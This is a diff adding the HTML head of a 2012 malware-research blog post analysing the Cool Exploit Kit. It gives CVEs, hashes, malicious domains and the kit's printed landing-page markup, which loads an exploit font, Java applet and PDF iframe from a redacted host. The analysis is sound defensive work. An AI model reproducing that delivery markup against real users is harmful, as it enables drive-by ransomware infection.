@@ -1,0 +1,577 @@
+<!doctype html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Cool Exploit Kit - A new Browser Exploit Pack on the Battlefield with a &quot;Duqu&quot; like font drop</title>
+
+    <link rel="stylesheet" type="text/css" href="http://malware2.dontneedcoffee.com/assets/css/styles_feeling_responsive.css">
+
+  
+
+	<script src="http://malware2.dontneedcoffee.com/assets/js/modernizr.min.js"></script>
+
+	<script src="https://ajax.googleapis.com/ajax/libs/webfont/1.5.18/webfont.js"></script>
+	<script>
+		WebFont.load({
+			google: {
+				families: [ 'Lato:400,700,400italic:latin', 'Volkhov::latin' ]
+			}
+		});
+	</script>
+
+	<noscript>
+		<link href='http://fonts.googleapis.com/css?family=Lato:400,700,400italic%7CVolkhov' rel='stylesheet' type='text/css'>
+	</noscript>
+
+
+	<!-- Search Engine Optimization -->
+	<meta name="description" content="Just for the &amp;nbsp;left panel Thumbnail :)Stats page titleSorry for the &quot;read it live&quot; post...the situation was moving while writing.Few days ago i discovered that a bunch of reverse proxies that I was linking to same Blackhole Exploit Kit were in fact linked to 2 different Blackhole (quite surely operated by same team -&amp;nbsp;I saw reverse proxies being redirected from one server to another one)Trying to build a signature to know which server was behind a specific reverse, I found a new exploit kit.Empty default statsI fast noticed few things./r/pricelist.php is a PDF exploit./r/myadv.php is a Java pack./font.php is a Reveton PE.I thought it would take weeks before it goes wild..but yesterday&amp;nbsp;Malekal catched a landing spreading Reveton (blood.falawllp.info /r/l/town-proved.php&amp;nbsp;) and I immediately recognized that new EK. So &amp;nbsp;I hunted the malvertising and found another domain but same landing pointing to an already known Reverse Proxy.Seems like it was time to take a deep look at this EK.Small improvement, it looks like the &quot;Sploit pack&quot; is being checked by tools like Scan4you.&amp;nbsp;When i first checked it, payload was not being pushed (all night long : no payload)CVE-2012-4681 - IE - WinXP 32btry.addsdice.com&amp;nbsp;/r/l/town-proved.php &amp;lt;-- try.addsdice.com full of meaning no ?try.addsdice.com /r/32size_font.eot &amp;lt;- ?try.addsdice.com /r/pricelist.phptry.addsdice.com /r/myadv.php.pack.gz&amp;nbsp;&amp;lt;- ?try.addsdice.com /r/myadv.phptry.addsdice.com /r/myadv.phptry.addsdice.com /r/l//r/f.php?k=1 &amp;lt;-- Vuln tracer for owner (seems guest does not have access to vuln break %)CVE-2012-4681 - Firefox - WinXP 32btry.addsdice.com&amp;nbsp;/r/l/town-proved.phptry.addsdice.com&amp;nbsp;/r/pricelist.phptry.addsdice.com&amp;nbsp;/r/l//r/f.php?k=1CVE-2012-0507 - IE - Win7 64b21x.xx.11x.1xx /r/l/town-proved.php21x.xx.11x.1xx /r/64size_font.eot&amp;nbsp;&amp;nbsp;&amp;lt;- ?21x.xx.11x.1xx /r/pricelist.php21x.xx.11x.1xx /r/myadv.php21x.xx.11x.1xx /r/myadv.php21x.xx.11x.1xx &amp;nbsp;/r/l//r/f.php?k=2CVE-2012-1723 - IE - Win7 64b21x.xx.11x.1xx&amp;nbsp;/r/l/town-proved.php21x.xx.11x.1xx&amp;nbsp;/r/64size_font.eot&amp;nbsp;&amp;nbsp;&amp;lt;- ?21x.xx.11x.1xx&amp;nbsp;/r/pricelist.php21x.xx.11x.1xx&amp;nbsp;/favicon.ico21x.xx.11x.1xx&amp;nbsp;/r/myadv.php21x.xx.11x.1xx&amp;nbsp;/r/f.php?k=4MDAC (you should not be hurt):21x.xx.11x.1xx&amp;nbsp;/r/l/town-proved.php21x.xx.11x.1xx&amp;nbsp;/r/32size_font.eot21x.xx.11x.1xx&amp;nbsp;/r/pricelist.phpNot up to date Win7 64b&amp;nbsp;- IE - &amp;nbsp;(j7u7)Note that there is NO payload on the EK right now, don&#39;t known how to be 100% sure the CVE is indeed active and that it&#39;s this CVE which is being used or a new thing...try.addsdice.com /r/l/town-proved.phptry.addsdice.com /r/64size_font.eottry.addsdice.com /r/pricelist.phptry.addsdice.com /favicon.icotry.addsdice.com /r/f.php?k=4&amp;nbsp;&amp;nbsp;&amp;lt;- ?try.addsdice.com /r/myadv.phptry.addsdice.com /r/myadv.phptry.addsdice.com /r/myadv.phptown-proved.php with IE &amp;nbsp;contains :&amp;lt;style&amp;gt;@font-face{font-family:&#39;p1&#39;;src:url(&#39;http://BEEPBEEP/64size_font.eot&#39;);}.duqu{font-size:5px;line-height:normal;font-family:&#39;p1&#39;;position:absolute;top:0px;left:0px;}&amp;lt;/style&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body onload=&#39;try{window.focus();}catch(e){}&#39;&amp;gt;&amp;lt;div class=&#39;duqu&#39;&amp;gt;:)&amp;lt;/div&amp;gt;&amp;lt;applet archive=&#39;http://BEEPBEEP/myadv.php&#39; code=&#39;ja.jh&#39; width=&#39;468&#39; height=&#39;200&#39;&amp;gt;&amp;lt;/applet&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;iframe src=&#39;http://BEEPBEEP/pricelist.php&#39; width=&#39;468&#39; height=&#39;468&#39;&amp;gt;&amp;lt;/iframe&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;Source code of the landing pushed to IE on x64 windows.duqu &amp;lt;- aouch, eactly what we could expect from a font drop !Cool EK Treefile.dll is a Reveton.myadv.php (jar) -&amp;nbsp;at least CVE-2012-4681, CVE-2012-507, CVE-2012-17230383be9bdb140f4588f5fb7c14d29fbdCVE-2012-4681 spotted in jar file from Cool EKfilelist.php (pdf)&amp;nbsp;- CVE-2010-01883bffc22ce0e67144c1b10da968f32f4c (2012-10-03) -&amp;nbsp;http://wepawet.iseclab.org/view.php?hash=3bffc22ce0e67144c1b10da968f32f4c&amp;amp;t=1349739053&amp;amp;type=js32size_font.eot :&amp;nbsp;050fbef5c814b2981fa61b7fc6820cbd64size_font.eot :&amp;nbsp;fada0b184b5372863a0c51f7fef5e2d0How good is the &quot;breaking&quot; percentage ?Guest stats on 1 thread (we can estimte that it&#39;s Reveton Infection via one Traffer)Stats are moving and i can&#39;t get infected by that thread. Look like they are testing the EK in Traffic Analyser mode.[EDIT - While Writing this post]Around 10am French time got infected. As expected : Reveton.So the Exploit Kit moved to production mode again.Tried to run the landing on a CVE-2011-3402&amp;nbsp;positive computer with java 7u7 got infected (but &amp;nbsp;it&#39;s not Java)Payload:&amp;nbsp;f15df53d8cca428d2dbe924fe1dff733Reveton for those who do not know (look botnets.fr/index.php/Reveton)Run it on a Fully patched IE 8/Windows on Win 64 and java 7u7 No infection.Tried to run the landing on a &amp;nbsp;&quot;Not up to date Win7 x64&quot; &amp;nbsp;positives computer without java : got infectedPayload :&amp;nbsp;106f1f7e3a24d1ae9af0efc0934a4dcbCall Home from that Reveton payload.Around 10:30 am : Malekal just found a new domain matching a known Reverse proxy that just switched from one BH EK server to this BH + Cool EK server.I do not know what this font is about.Is this a &quot;new (?)&quot; enabler for CVE-2012-4969. Is this another patched vuln from Internet Explorer ?Am getting help to sort this out. Will update this post.&amp;lt;edit1&amp;gt; got answer by Kaspersky Labs : it&#39;s&amp;nbsp;CVE-2011-3402so I s/CVE-2012-4969/CVE-2011-3402 this post...yes not ethical ;)On my MDAC VM :KB2676562 fix CVE-2011-3402Removing this should allow exploitation - Work in progress.&amp;lt;/edit1&amp;gt;&amp;lt;edit2&amp;gt;After fighting hours with Updates and this EK (that was not Cool trust me) it seems that if you have at least one of this component installed, you are not vuln to the &quot;Duqu-like&quot; font drop :-KB2676562 - CVE-2011-3402-KB2744842 - CVE-2012-4969-KB2718523 -&amp;nbsp;CVE-2012-1893/CVE-2012-1890-Windows Explorer 9.0Downgrading a Windows 7x64 bits to see required &quot;missing&quot; KB to get owned-= mean i removed this Patch.Sound not so awful. I add all md5, VT Link etc...and my future edit should be the Libtiff path if i find time , adding a map of the distribution of Reverse proxies and maybe link to the detailed/technical explanation of this &quot;Duqu-like&quot; font drop, if someone work on it.&amp;lt;/edit2&amp;gt;&amp;lt;/edit4 15/10/12&amp;gt; Added the Cool EK PokeAMole BoardHere is it&#39;s distribution to play the Poke A Mole with the defense :Cool EK Poke A Mole Board (Snapshot as I see it on 13/10/2012)Explanation/Disclaimer at the End - Edit4Too small ? :&amp;nbsp;http://i.minus.com/ibbdTxd1LpqqHr.jpgCredits for Components used in this model :&amp;nbsp;http://pastebin.com/HsugYbhLExplanation :One server = One IP am aware of, on the 13/10/2012One rectangle = /24 rangeOne color/server model &amp;nbsp;= One ASOne traffer = One thread am aware of (quite sure there is more)Disclaimer : It&#39;s a schema focused on Cool EK &quot;PokeAMole&quot; architecture and threads. We do not describe what happen before binary is pushed on the EK and after infection events.So things are in some way- simplified : traffer often have the same kind of architecture (many IP hiding a main server (TDS, Fake adv server, etc...)), there is often traffic exchange plaform increasing the number of hop, traffer can sometime be feed by botnets and are often feed by emailing/Iframe on compromised server (so other actors/hats are in the loop, selling credentials, pushing iframe).There is a live case where automation is so well done, that two (it seems) guys can handle many hats (gathering credentials, mass iframing/emailing, traffic, EK, pushing Zbot/Pony, and gathering credentials...Perpetual motion ;) ).- complexified : for instance on AS57999, it would be really surprising if there is more than one server. In my opinion there the PokeAMole is just a game of IP/Routing configuration.But from outside what you face is the same as what is represented here + domain name rotation.&amp;nbsp;&amp;lt;edit4&amp;gt;&amp;lt;edit3 without comment 12/10/12&amp;gt;New parameters e and f are appearing in the payload URL :&amp;lt;/edit3&amp;gt;&amp;lt;edit5 28/10/12&amp;gt; It seems now that you need a direct access to get the final payload via java payload since 25/10/2012Here are files to check by yourself (always happy to have feedback ;) ):Jar Before &amp;amp; After&amp;nbsp;(OwnCloud via Goo.gl)Fiddler Before &amp;amp; After&amp;nbsp;(OwnCloud via Goo.gl)&amp;lt;/edit5&amp;gt;Post Publication reading:CVE-2011-3402 and Cool Exploit Kit&amp;nbsp;- 2012-11-28 - yomuds -&amp;nbsp;a bunch of random security bits!">
+  	
+	
+	<link rel="author" href="https://www.blogger.com/profile/16711421957420573353">
+	
+	
+	<link rel="canonical" href="http://malware2.dontneedcoffee.com/2012/10/newcoolek.html">
+
+
+	<!-- Facebook Open Graph -->
+	<meta property="og:title" content="Cool Exploit Kit - A new Browser Exploit Pack on the Battlefield with a &quot;Duqu&quot; like font drop">
+	<meta property="og:description" content="Just for the &amp;nbsp;left panel Thumbnail :)Stats page titleSorry for the &quot;read it live&quot; post...the situation was moving while writing.Few days ago i discovered that a bunch of reverse proxies that I was linking to same Blackhole Exploit Kit were in fact linked to 2 different Blackhole (quite surely operated by same team -&amp;nbsp;I saw reverse proxies being redirected from one server to another one)Trying to build a signature to know which server was behind a specific reverse, I found a new exploit kit.Empty default statsI fast noticed few things./r/pricelist.php is a PDF exploit./r/myadv.php is a Java pack./font.php is a Reveton PE.I thought it would take weeks before it goes wild..but yesterday&amp;nbsp;Malekal catched a landing spreading Reveton (blood.falawllp.info /r/l/town-proved.php&amp;nbsp;) and I immediately recognized that new EK. So &amp;nbsp;I hunted the malvertising and found another domain but same landing pointing to an already known Reverse Proxy.Seems like it was time to take a deep look at this EK.Small improvement, it looks like the &quot;Sploit pack&quot; is being checked by tools like Scan4you.&amp;nbsp;When i first checked it, payload was not being pushed (all night long : no payload)CVE-2012-4681 - IE - WinXP 32btry.addsdice.com&amp;nbsp;/r/l/town-proved.php &amp;lt;-- try.addsdice.com full of meaning no ?try.addsdice.com /r/32size_font.eot &amp;lt;- ?try.addsdice.com /r/pricelist.phptry.addsdice.com /r/myadv.php.pack.gz&amp;nbsp;&amp;lt;- ?try.addsdice.com /r/myadv.phptry.addsdice.com /r/myadv.phptry.addsdice.com /r/l//r/f.php?k=1 &amp;lt;-- Vuln tracer for owner (seems guest does not have access to vuln break %)CVE-2012-4681 - Firefox - WinXP 32btry.addsdice.com&amp;nbsp;/r/l/town-proved.phptry.addsdice.com&amp;nbsp;/r/pricelist.phptry.addsdice.com&amp;nbsp;/r/l//r/f.php?k=1CVE-2012-0507 - IE - Win7 64b21x.xx.11x.1xx /r/l/town-proved.php21x.xx.11x.1xx /r/64size_font.eot&amp;nbsp;&amp;nbsp;&amp;lt;- ?21x.xx.11x.1xx /r/pricelist.php21x.xx.11x.1xx /r/myadv.php21x.xx.11x.1xx /r/myadv.php21x.xx.11x.1xx &amp;nbsp;/r/l//r/f.php?k=2CVE-2012-1723 - IE - Win7 64b21x.xx.11x.1xx&amp;nbsp;/r/l/town-proved.php21x.xx.11x.1xx&amp;nbsp;/r/64size_font.eot&amp;nbsp;&amp;nbsp;&amp;lt;- ?21x.xx.11x.1xx&amp;nbsp;/r/pricelist.php21x.xx.11x.1xx&amp;nbsp;/favicon.ico21x.xx.11x.1xx&amp;nbsp;/r/myadv.php21x.xx.11x.1xx&amp;nbsp;/r/f.php?k=4MDAC (you should not be hurt):21x.xx.11x.1xx&amp;nbsp;/r/l/town-proved.php21x.xx.11x.1xx&amp;nbsp;/r/32size_font.eot21x.xx.11x.1xx&amp;nbsp;/r/pricelist.phpNot up to date Win7 64b&amp;nbsp;- IE - &amp;nbsp;(j7u7)Note that there is NO payload on the EK right now, don&#39;t known how to be 100% sure the CVE is indeed active and that it&#39;s this CVE which is being used or a new thing...try.addsdice.com /r/l/town-proved.phptry.addsdice.com /r/64size_font.eottry.addsdice.com /r/pricelist.phptry.addsdice.com /favicon.icotry.addsdice.com /r/f.php?k=4&amp;nbsp;&amp;nbsp;&amp;lt;- ?try.addsdice.com /r/myadv.phptry.addsdice.com /r/myadv.phptry.addsdice.com /r/myadv.phptown-proved.php with IE &amp;nbsp;contains :&amp;lt;style&amp;gt;@font-face{font-family:&#39;p1&#39;;src:url(&#39;http://BEEPBEEP/64size_font.eot&#39;);}.duqu{font-size:5px;line-height:normal;font-family:&#39;p1&#39;;position:absolute;top:0px;left:0px;}&amp;lt;/style&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body onload=&#39;try{window.focus();}catch(e){}&#39;&amp;gt;&amp;lt;div class=&#39;duqu&#39;&amp;gt;:)&amp;lt;/div&amp;gt;&amp;lt;applet archive=&#39;http://BEEPBEEP/myadv.php&#39; code=&#39;ja.jh&#39; width=&#39;468&#39; height=&#39;200&#39;&amp;gt;&amp;lt;/applet&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;iframe src=&#39;http://BEEPBEEP/pricelist.php&#39; width=&#39;468&#39; height=&#39;468&#39;&amp;gt;&amp;lt;/iframe&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;Source code of the landing pushed to IE on x64 windows.duqu &amp;lt;- aouch, eactly what we could expect from a font drop !Cool EK Treefile.dll is a Reveton.myadv.php (jar) -&amp;nbsp;at least CVE-2012-4681, CVE-2012-507, CVE-2012-17230383be9bdb140f4588f5fb7c14d29fbdCVE-2012-4681 spotted in jar file from Cool EKfilelist.php (pdf)&amp;nbsp;- CVE-2010-01883bffc22ce0e67144c1b10da968f32f4c (2012-10-03) -&amp;nbsp;http://wepawet.iseclab.org/view.php?hash=3bffc22ce0e67144c1b10da968f32f4c&amp;amp;t=1349739053&amp;amp;type=js32size_font.eot :&amp;nbsp;050fbef5c814b2981fa61b7fc6820cbd64size_font.eot :&amp;nbsp;fada0b184b5372863a0c51f7fef5e2d0How good is the &quot;breaking&quot; percentage ?Guest stats on 1 thread (we can estimte that it&#39;s Reveton Infection via one Traffer)Stats are moving and i can&#39;t get infected by that thread. Look like they are testing the EK in Traffic Analyser mode.[EDIT - While Writing this post]Around 10am French time got infected. As expected : Reveton.So the Exploit Kit moved to production mode again.Tried to run the landing on a CVE-2011-3402&amp;nbsp;positive computer with java 7u7 got infected (but &amp;nbsp;it&#39;s not Java)Payload:&amp;nbsp;f15df53d8cca428d2dbe924fe1dff733Reveton for those who do not know (look botnets.fr/index.php/Reveton)Run it on a Fully patched IE 8/Windows on Win 64 and java 7u7 No infection.Tried to run the landing on a &amp;nbsp;&quot;Not up to date Win7 x64&quot; &amp;nbsp;positives computer without java : got infectedPayload :&amp;nbsp;106f1f7e3a24d1ae9af0efc0934a4dcbCall Home from that Reveton payload.Around 10:30 am : Malekal just found a new domain matching a known Reverse proxy that just switched from one BH EK server to this BH + Cool EK server.I do not know what this font is about.Is this a &quot;new (?)&quot; enabler for CVE-2012-4969. Is this another patched vuln from Internet Explorer ?Am getting help to sort this out. Will update this post.&amp;lt;edit1&amp;gt; got answer by Kaspersky Labs : it&#39;s&amp;nbsp;CVE-2011-3402so I s/CVE-2012-4969/CVE-2011-3402 this post...yes not ethical ;)On my MDAC VM :KB2676562 fix CVE-2011-3402Removing this should allow exploitation - Work in progress.&amp;lt;/edit1&amp;gt;&amp;lt;edit2&amp;gt;After fighting hours with Updates and this EK (that was not Cool trust me) it seems that if you have at least one of this component installed, you are not vuln to the &quot;Duqu-like&quot; font drop :-KB2676562 - CVE-2011-3402-KB2744842 - CVE-2012-4969-KB2718523 -&amp;nbsp;CVE-2012-1893/CVE-2012-1890-Windows Explorer 9.0Downgrading a Windows 7x64 bits to see required &quot;missing&quot; KB to get owned-= mean i removed this Patch.Sound not so awful. I add all md5, VT Link etc...and my future edit should be the Libtiff path if i find time , adding a map of the distribution of Reverse proxies and maybe link to the detailed/technical explanation of this &quot;Duqu-like&quot; font drop, if someone work on it.&amp;lt;/edit2&amp;gt;&amp;lt;/edit4 15/10/12&amp;gt; Added the Cool EK PokeAMole BoardHere is it&#39;s distribution to play the Poke A Mole with the defense :Cool EK Poke A Mole Board (Snapshot as I see it on 13/10/2012)Explanation/Disclaimer at the End - Edit4Too small ? :&amp;nbsp;http://i.minus.com/ibbdTxd1LpqqHr.jpgCredits for Components used in this model :&amp;nbsp;http://pastebin.com/HsugYbhLExplanation :One server = One IP am aware of, on the 13/10/2012One rectangle = /24 rangeOne color/server model &amp;nbsp;= One ASOne traffer = One thread am aware of (quite sure there is more)Disclaimer : It&#39;s a schema focused on Cool EK &quot;PokeAMole&quot; architecture and threads. We do not describe what happen before binary is pushed on the EK and after infection events.So things are in some way- simplified : traffer often have the same kind of architecture (many IP hiding a main server (TDS, Fake adv server, etc...)), there is often traffic exchange plaform increasing the number of hop, traffer can sometime be feed by botnets and are often feed by emailing/Iframe on compromised server (so other actors/hats are in the loop, selling credentials, pushing iframe).There is a live case where automation is so well done, that two (it seems) guys can handle many hats (gathering credentials, mass iframing/emailing, traffic, EK, pushing Zbot/Pony, and gathering credentials...Perpetual motion ;) ).- complexified : for instance on AS57999, it would be really surprising if there is more than one server. In my opinion there the PokeAMole is just a game of IP/Routing configuration.But from outside what you face is the same as what is represented here + domain name rotation.&amp;nbsp;&amp;lt;edit4&amp;gt;&amp;lt;edit3 without comment 12/10/12&amp;gt;New parameters e and f are appearing in the payload URL :&amp;lt;/edit3&amp;gt;&amp;lt;edit5 28/10/12&amp;gt; It seems now that you need a direct access to get the final payload via java payload since 25/10/2012Here are files to check by yourself (always happy to have feedback ;) ):Jar Before &amp;amp; After&amp;nbsp;(OwnCloud via Goo.gl)Fiddler Before &amp;amp; After&amp;nbsp;(OwnCloud via Goo.gl)&amp;lt;/edit5&amp;gt;Post Publication reading:CVE-2011-3402 and Cool Exploit Kit&amp;nbsp;- 2012-11-28 - yomuds -&amp;nbsp;a bunch of random security bits!">
+	<meta property="og:url" content="http://malware2.dontneedcoffee.com/2012/10/newcoolek.html">
+	<meta property="og:locale" content="en_EN">
+	<meta property="og:type" content="website">
+	<meta property="og:site_name" content="MDNC | Malware don't need Coffee">
+	
+	
+
+
+	
+	<!-- Twitter -->
+	<meta name="twitter:card" content="summary">
+	<meta name="twitter:site" content="Kafeine">
+	<meta name="twitter:creator" content="Kafeine">
+	<meta name="twitter:title" content="Cool Exploit Kit - A new Browser Exploit Pack on the Battlefield with a &quot;Duqu&quot; like font drop">
+	<meta name="twitter:description" content="Just for the &amp;nbsp;left panel Thumbnail :)Stats page titleSorry for the &quot;read it live&quot; post...the situation was moving while writing.Few days ago i discovered that a bunch of reverse proxies that I was linking to same Blackhole Exploit Kit were in fact linked to 2 different Blackhole (quite surely operated by same team -&amp;nbsp;I saw reverse proxies being redirected from one server to another one)Trying to build a signature to know which server was behind a specific reverse, I found a new exploit kit.Empty default statsI fast noticed few things./r/pricelist.php is a PDF exploit./r/myadv.php is a Java pack./font.php is a Reveton PE.I thought it would take weeks before it goes wild..but yesterday&amp;nbsp;Malekal catched a landing spreading Reveton (blood.falawllp.info /r/l/town-proved.php&amp;nbsp;) and I immediately recognized that new EK. So &amp;nbsp;I hunted the malvertising and found another domain but same landing pointing to an already known Reverse Proxy.Seems like it was time to take a deep look at this EK.Small improvement, it looks like the &quot;Sploit pack&quot; is being checked by tools like Scan4you.&amp;nbsp;When i first checked it, payload was not being pushed (all night long : no payload)CVE-2012-4681 - IE - WinXP 32btry.addsdice.com&amp;nbsp;/r/l/town-proved.php &amp;lt;-- try.addsdice.com full of meaning no ?try.addsdice.com /r/32size_font.eot &amp;lt;- ?try.addsdice.com /r/pricelist.phptry.addsdice.com /r/myadv.php.pack.gz&amp;nbsp;&amp;lt;- ?try.addsdice.com /r/myadv.phptry.addsdice.com /r/myadv.phptry.addsdice.com /r/l//r/f.php?k=1 &amp;lt;-- Vuln tracer for owner (seems guest does not have access to vuln break %)CVE-2012-4681 - Firefox - WinXP 32btry.addsdice.com&amp;nbsp;/r/l/town-proved.phptry.addsdice.com&amp;nbsp;/r/pricelist.phptry.addsdice.com&amp;nbsp;/r/l//r/f.php?k=1CVE-2012-0507 - IE - Win7 64b21x.xx.11x.1xx /r/l/town-proved.php21x.xx.11x.1xx /r/64size_font.eot&amp;nbsp;&amp;nbsp;&amp;lt;- ?21x.xx.11x.1xx /r/pricelist.php21x.xx.11x.1xx /r/myadv.php21x.xx.11x.1xx /r/myadv.php21x.xx.11x.1xx &amp;nbsp;/r/l//r/f.php?k=2CVE-2012-1723 - IE - Win7 64b21x.xx.11x.1xx&amp;nbsp;/r/l/town-proved.php21x.xx.11x.1xx&amp;nbsp;/r/64size_font.eot&amp;nbsp;&amp;nbsp;&amp;lt;- ?21x.xx.11x.1xx&amp;nbsp;/r/pricelist.php21x.xx.11x.1xx&amp;nbsp;/favicon.ico21x.xx.11x.1xx&amp;nbsp;/r/myadv.php21x.xx.11x.1xx&amp;nbsp;/r/f.php?k=4MDAC (you should not be hurt):21x.xx.11x.1xx&amp;nbsp;/r/l/town-proved.php21x.xx.11x.1xx&amp;nbsp;/r/32size_font.eot21x.xx.11x.1xx&amp;nbsp;/r/pricelist.phpNot up to date Win7 64b&amp;nbsp;- IE - &amp;nbsp;(j7u7)Note that there is NO payload on the EK right now, don&#39;t known how to be 100% sure the CVE is indeed active and that it&#39;s this CVE which is being used or a new thing...try.addsdice.com /r/l/town-proved.phptry.addsdice.com /r/64size_font.eottry.addsdice.com /r/pricelist.phptry.addsdice.com /favicon.icotry.addsdice.com /r/f.php?k=4&amp;nbsp;&amp;nbsp;&amp;lt;- ?try.addsdice.com /r/myadv.phptry.addsdice.com /r/myadv.phptry.addsdice.com /r/myadv.phptown-proved.php with IE &amp;nbsp;contains :&amp;lt;style&amp;gt;@font-face{font-family:&#39;p1&#39;;src:url(&#39;http://BEEPBEEP/64size_font.eot&#39;);}.duqu{font-size:5px;line-height:normal;font-family:&#39;p1&#39;;position:absolute;top:0px;left:0px;}&amp;lt;/style&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body onload=&#39;try{window.focus();}catch(e){}&#39;&amp;gt;&amp;lt;div class=&#39;duqu&#39;&amp;gt;:)&amp;lt;/div&amp;gt;&amp;lt;applet archive=&#39;http://BEEPBEEP/myadv.php&#39; code=&#39;ja.jh&#39; width=&#39;468&#39; height=&#39;200&#39;&amp;gt;&amp;lt;/applet&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;iframe src=&#39;http://BEEPBEEP/pricelist.php&#39; width=&#39;468&#39; height=&#39;468&#39;&amp;gt;&amp;lt;/iframe&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;Source code of the landing pushed to IE on x64 windows.duqu &amp;lt;- aouch, eactly what we could expect from a font drop !Cool EK Treefile.dll is a Reveton.myadv.php (jar) -&amp;nbsp;at least CVE-2012-4681, CVE-2012-507, CVE-2012-17230383be9bdb140f4588f5fb7c14d29fbdCVE-2012-4681 spotted in jar file from Cool EKfilelist.php (pdf)&amp;nbsp;- CVE-2010-01883bffc22ce0e67144c1b10da968f32f4c (2012-10-03) -&amp;nbsp;http://wepawet.iseclab.org/view.php?hash=3bffc22ce0e67144c1b10da968f32f4c&amp;amp;t=1349739053&amp;amp;type=js32size_font.eot :&amp;nbsp;050fbef5c814b2981fa61b7fc6820cbd64size_font.eot :&amp;nbsp;fada0b184b5372863a0c51f7fef5e2d0How good is the &quot;breaking&quot; percentage ?Guest stats on 1 thread (we can estimte that it&#39;s Reveton Infection via one Traffer)Stats are moving and i can&#39;t get infected by that thread. Look like they are testing the EK in Traffic Analyser mode.[EDIT - While Writing this post]Around 10am French time got infected. As expected : Reveton.So the Exploit Kit moved to production mode again.Tried to run the landing on a CVE-2011-3402&amp;nbsp;positive computer with java 7u7 got infected (but &amp;nbsp;it&#39;s not Java)Payload:&amp;nbsp;f15df53d8cca428d2dbe924fe1dff733Reveton for those who do not know (look botnets.fr/index.php/Reveton)Run it on a Fully patched IE 8/Windows on Win 64 and java 7u7 No infection.Tried to run the landing on a &amp;nbsp;&quot;Not up to date Win7 x64&quot; &amp;nbsp;positives computer without java : got infectedPayload :&amp;nbsp;106f1f7e3a24d1ae9af0efc0934a4dcbCall Home from that Reveton payload.Around 10:30 am : Malekal just found a new domain matching a known Reverse proxy that just switched from one BH EK server to this BH + Cool EK server.I do not know what this font is about.Is this a &quot;new (?)&quot; enabler for CVE-2012-4969. Is this another patched vuln from Internet Explorer ?Am getting help to sort this out. Will update this post.&amp;lt;edit1&amp;gt; got answer by Kaspersky Labs : it&#39;s&amp;nbsp;CVE-2011-3402so I s/CVE-2012-4969/CVE-2011-3402 this post...yes not ethical ;)On my MDAC VM :KB2676562 fix CVE-2011-3402Removing this should allow exploitation - Work in progress.&amp;lt;/edit1&amp;gt;&amp;lt;edit2&amp;gt;After fighting hours with Updates and this EK (that was not Cool trust me) it seems that if you have at least one of this component installed, you are not vuln to the &quot;Duqu-like&quot; font drop :-KB2676562 - CVE-2011-3402-KB2744842 - CVE-2012-4969-KB2718523 -&amp;nbsp;CVE-2012-1893/CVE-2012-1890-Windows Explorer 9.0Downgrading a Windows 7x64 bits to see required &quot;missing&quot; KB to get owned-= mean i removed this Patch.Sound not so awful. I add all md5, VT Link etc...and my future edit should be the Libtiff path if i find time , adding a map of the distribution of Reverse proxies and maybe link to the detailed/technical explanation of this &quot;Duqu-like&quot; font drop, if someone work on it.&amp;lt;/edit2&amp;gt;&amp;lt;/edit4 15/10/12&amp;gt; Added the Cool EK PokeAMole BoardHere is it&#39;s distribution to play the Poke A Mole with the defense :Cool EK Poke A Mole Board (Snapshot as I see it on 13/10/2012)Explanation/Disclaimer at the End - Edit4Too small ? :&amp;nbsp;http://i.minus.com/ibbdTxd1LpqqHr.jpgCredits for Components used in this model :&amp;nbsp;http://pastebin.com/HsugYbhLExplanation :One server = One IP am aware of, on the 13/10/2012One rectangle = /24 rangeOne color/server model &amp;nbsp;= One ASOne traffer = One thread am aware of (quite sure there is more)Disclaimer : It&#39;s a schema focused on Cool EK &quot;PokeAMole&quot; architecture and threads. We do not describe what happen before binary is pushed on the EK and after infection events.So things are in some way- simplified : traffer often have the same kind of architecture (many IP hiding a main server (TDS, Fake adv server, etc...)), there is often traffic exchange plaform increasing the number of hop, traffer can sometime be feed by botnets and are often feed by emailing/Iframe on compromised server (so other actors/hats are in the loop, selling credentials, pushing iframe).There is a live case where automation is so well done, that two (it seems) guys can handle many hats (gathering credentials, mass iframing/emailing, traffic, EK, pushing Zbot/Pony, and gathering credentials...Perpetual motion ;) ).- complexified : for instance on AS57999, it would be really surprising if there is more than one server. In my opinion there the PokeAMole is just a game of IP/Routing configuration.But from outside what you face is the same as what is represented here + domain name rotation.&amp;nbsp;&amp;lt;edit4&amp;gt;&amp;lt;edit3 without comment 12/10/12&amp;gt;New parameters e and f are appearing in the payload URL :&amp;lt;/edit3&amp;gt;&amp;lt;edit5 28/10/12&amp;gt; It seems now that you need a direct access to get the final payload via java payload since 25/10/2012Here are files to check by yourself (always happy to have feedback ;) ):Jar Before &amp;amp; After&amp;nbsp;(OwnCloud via Goo.gl)Fiddler Before &amp;amp; After&amp;nbsp;(OwnCloud via Goo.gl)&amp;lt;/edit5&amp;gt;Post Publication reading:CVE-2011-3402 and Cool Exploit Kit&amp;nbsp;- 2012-11-28 - yomuds -&amp;nbsp;a bunch of random security bits!">
+	
+	
+
+	<link type="text/plain" rel="author" href="http://malware2.dontneedcoffee.com/humans.txt">
+
+	
+
+	
+
+	<link rel="icon" sizes="32x32" href="http://malware2.dontneedcoffee.com/assets/img/favicon-32x32.png">
+
+	<link rel="icon" sizes="192x192" href="http://malware2.dontneedcoffee.com/assets/img/touch-icon-192x192.png">
+
+	<link rel="apple-touch-icon-precomposed" sizes="180x180" href="http://malware2.dontneedcoffee.com/assets/img/apple-touch-icon-180x180-precomposed.png">
+
+	<link rel="apple-touch-icon-precomposed" sizes="152x152" href="http://malware2.dontneedcoffee.com/assets/img/apple-touch-icon-152x152-precomposed.png">
+
+	<link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://malware2.dontneedcoffee.com/assets/img/apple-touch-icon-144x144-precomposed.png">
+
+	<link rel="apple-touch-icon-precomposed" sizes="120x120" href="http://malware2.dontneedcoffee.com/assets/img/apple-touch-icon-120x120-precomposed.png">
+
